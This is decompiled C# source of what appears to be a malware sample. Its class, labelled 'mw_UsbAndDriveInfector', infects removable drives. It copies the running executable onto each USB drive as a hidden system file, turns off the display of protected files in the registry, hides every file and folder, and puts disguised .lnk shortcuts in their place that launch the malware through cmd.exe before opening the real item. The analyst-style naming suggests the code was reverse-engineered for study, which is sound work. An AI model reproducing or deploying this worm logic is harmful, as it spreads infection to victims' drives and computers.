using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;

namespace Stub
{
	// Token: 0x0200000D RID: 13
	public class mw_UsbAndDriveInfector
	{
		// Token: 0x0600007E RID: 126 RVA: 0x00005498 File Offset: 0x00003698
		public static void mw_startNewThread()
		{
			try
			{
				mw_UsbAndDriveInfector.mw_thread = new Thread(new ThreadStart(mw_UsbAndDriveInfector.mw_infectDrives), 1);
				mw_UsbAndDriveInfector.mw_thread.Start();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600007F RID: 127 RVA: 0x000054E8 File Offset: 0x000036E8
		public static void mw_abortThread()
		{
			try
			{
				mw_UsbAndDriveInfector.mw_thread.Abort();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000080 RID: 128
		private static void mw_infectDrives()
		{
			int num2;
			int num4;
			object obj3;
			try
			{
				IL_00:
				int num = 1;
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("wscript.shell", ""));
				IL_18:
				checked
				{
					for (;;)
					{
						IL_74D:
						num = 3;
						if (!true)
						{
							break;
						}
						IL_1D:
						ProjectData.ClearProjectError();
						num2 = 1;
						IL_25:
						num = 5;
						RegistryKey registryKey = Template.Computer.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", true);
						IL_43:
						num = 6;
						if (Operators.ConditionalCompareObjectEqual(registryKey.GetValue("ShowSuperHidden"), 1, false))
						{
							IL_5F:
							num = 7;
							registryKey.SetValue("ShowSuperHidden", 0);
						}
						IL_73:
						num = 9;
						DriveInfo[] drives = DriveInfo.GetDrives();
						int i = 0;
						while (i < drives.Length)
						{
							DriveInfo driveInfo = drives[i];
							IL_8C:
							num = 10;
							if (driveInfo.IsReady)
							{
								IL_9B:
								num = 11;
								if (driveInfo.DriveType == DriveType.Removable)
								{
									IL_AB:
									num = 12;
									string name = driveInfo.Name;
									IL_B6:
									num = 13;
									if (!File.Exists(name + mw_config.mw_driveInfectionFilename))
									{
										IL_CC:
										num = 14;
										File.WriteAllBytes(name + mw_config.mw_driveInfectionFilename, File.ReadAllBytes(mw_Handler.mw_currentProcessFilename));
										IL_EA:
										num = 15;
										File.SetAttributes(name + mw_config.mw_driveInfectionFilename, FileAttributes.Hidden | FileAttributes.System);
									}
									IL_FF:
									num = 17;
									string[] files = Directory.GetFiles(name);
									int j = 0;
									while (j < files.Length)
									{
										string text = files[j];
										IL_11A:
										num = 18;
										if (Operators.CompareString(Path.GetExtension(text).ToLower(), ".lnk", false) != 0 & Operators.CompareString(text.ToLower(), name.ToLower() + mw_config.mw_driveInfectionFilename.ToLower(), false) != 0)
										{
											IL_169:
											num = 19;
											File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
											IL_175:
											num = 20;
											object instance = NewLateBinding.LateGet(objectValue, null, "CreateShortcut", new object[]
											{
												name + new FileInfo(text).Name + ".lnk"
											}, null, null, null);
											IL_1AF:
											num = 21;
											NewLateBinding.LateSetComplex(instance, null, "windowstyle", new object[]
											{
												7
											}, null, null, false, true);
											IL_1D8:
											num = 22;
											NewLateBinding.LateSetComplex(instance, null, "TargetPath", new object[]
											{
												"cmd.exe"
											}, null, null, false, true);
											IL_200:
											num = 23;
											NewLateBinding.LateSetComplex(instance, null, "WorkingDirectory", new object[]
											{
												""
											}, null, null, false, true);
											IL_228:
											num = 24;
											NewLateBinding.LateSetComplex(instance, null, "Arguments", new object[]
											{
												string.Concat(new string[]
												{
													"/c start ",
													mw_config.mw_driveInfectionFilename.Replace(" ", "\" \""),
													"&start ",
													new FileInfo(text).Name.Replace(" ", "\" \""),
													" & exit"
												})
											}, null, null, false, true);
											IL_2AC:
											num = 25;
											object obj = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "regread", new object[]
											{
												Operators.ConcatenateObject(Operators.ConcatenateObject("HKEY_LOCAL_MACHINE\\software\\classes\\", NewLateBinding.LateGet(objectValue, null, "regread", new object[]
												{
													"HKEY_LOCAL_MACHINE\\software\\classes\\." + Strings.Split(Path.GetFileName(text), ".", -1, CompareMethod.Binary)[Information.UBound(Strings.Split(Path.GetFileName(text), ".", -1, CompareMethod.Binary), 1)] + "\\"
												}, null, null, null)), "\\defaulticon\\")
											}, null, null, null));
											IL_341:
											num = 26;
											object right = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, null, "CreateShortcut", new object[]
											{
												name + new FileInfo(text).Name + ".lnk"
											}, null, null, null), null, "IconLocation", new object[0], null, null, null));
											IL_394:
											num = 27;
											if (Strings.InStr(Conversions.ToString(obj), ",", CompareMethod.Binary) == 0)
											{
												IL_3AD:
												num = 28;
												NewLateBinding.LateSetComplex(instance, null, "iconlocation", new object[]
												{
													text
												}, null, null, false, true);
												IL_3D2:;
											}
											else
											{
												IL_3D4:
												num = 30;
												IL_3D8:
												num = 31;
												NewLateBinding.LateSetComplex(instance, null, "iconlocation", new object[]
												{
													RuntimeHelpers.GetObjectValue(obj)
												}, null, null, false, true);
											}
											IL_402:
											num = 33;
											if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(instance, null, "iconlocation", new object[0], null, null, null), right, false))))
											{
												IL_430:
												num = 34;
												NewLateBinding.LateCall(instance, null, "Save", new object[0], null, null, null, true);
											}
											IL_44C:
											num = 36;
											right = null;
											IL_453:
											num = 37;
											obj = null;
											IL_45A:
											instance = null;
										}
										IL_45D:
										j++;
										IL_463:
										num = 40;
									}
									IL_472:
									num = 41;
									string[] directories = Directory.GetDirectories(name);
									int k = 0;
									while (k < directories.Length)
									{
										string text2 = directories[k];
										IL_48D:
										num = 42;
										File.SetAttributes(text2, FileAttributes.Hidden | FileAttributes.System);
										IL_499:
										num = 43;
										object instance2 = NewLateBinding.LateGet(objectValue, null, "CreateShortcut", new object[]
										{
											name + Path.GetFileNameWithoutExtension(text2) + " .lnk"
										}, null, null, null);
										IL_4CE:
										num = 44;
										NewLateBinding.LateSetComplex(instance2, null, "windowstyle", new object[]
										{
											7
										}, null, null, false, true);
										IL_4F7:
										num = 45;
										NewLateBinding.LateSetComplex(instance2, null, "TargetPath", new object[]
										{
											"cmd.exe"
										}, null, null, false, true);
										IL_51F:
										num = 46;
										NewLateBinding.LateSetComplex(instance2, null, "WorkingDirectory", new object[]
										{
											""
										}, null, null, false, true);
										IL_547:
										num = 47;
										NewLateBinding.LateSetComplex(instance2, null, "arguments", new object[]
										{
											string.Concat(new string[]
											{
												"/c start ",
												Strings.Replace(mw_config.mw_driveInfectionFilename, " ", "\" \"", 1, -1, CompareMethod.Binary),
												"&start explorer ",
												Strings.Replace(new DirectoryInfo(text2).Name, " ", "\" \"", 1, -1, CompareMethod.Binary),
												"&exit"
											})
										}, null, null, false, true);
										IL_5D1:
										num = 48;
										object obj2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "regread", new object[]
										{
											"HKEY_LOCAL_MACHINE\\software\\classes\\folder\\defaulticon\\"
										}, null, null, null));
										IL_5FE:
										num = 49;
										object right2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, null, "CreateShortcut", new object[]
										{
											name + Path.GetFileNameWithoutExtension(text2) + " .lnk"
										}, null, null, null), null, "IconLocation", new object[0], null, null, null));
										IL_64C:
										num = 50;
										if (Strings.InStr(Conversions.ToString(obj2), ",", CompareMethod.Binary) == 0)
										{
											IL_665:
											num = 51;
											NewLateBinding.LateSetComplex(instance2, null, "IconLocation", new object[]
											{
												text2
											}, null, null, false, true);
											IL_68A:;
										}
										else
										{
											IL_68C:
											num = 53;
											IL_690:
											num = 54;
											NewLateBinding.LateSetComplex(instance2, null, "IconLocation", new object[]
											{
												RuntimeHelpers.GetObjectValue(obj2)
											}, null, null, false, true);
										}
										IL_6BA:
										num = 56;
										if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(instance2, null, "iconlocation", new object[0], null, null, null), right2, false))))
										{
											IL_6E8:
											num = 57;
											NewLateBinding.LateCall(instance2, null, "Save", new object[0], null, null, null, true);
										}
										IL_704:
										num = 59;
										right2 = null;
										IL_70B:
										num = 60;
										obj2 = null;
										IL_712:
										instance2 = null;
										k++;
										IL_71B:
										num = 62;
									}
								}
							}
							IL_72A:
							i++;
							IL_730:
							num = 65;
						}
						IL_73F:
						num = 66;
						Thread.Sleep(5000);
					}
					IL_756:
					goto IL_8C3;
					IL_75F:;
				}
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_87F:
				goto IL_8B8;
				IL_881:
				num4 = num;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num2);
				IL_894:;
			}
			catch when (endfilter(obj3 is Exception & num2 != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj4;
				goto IL_881;
			}
			IL_8B8:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_8C3:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x04000026 RID: 38
		private static Thread mw_thread;
	}
}
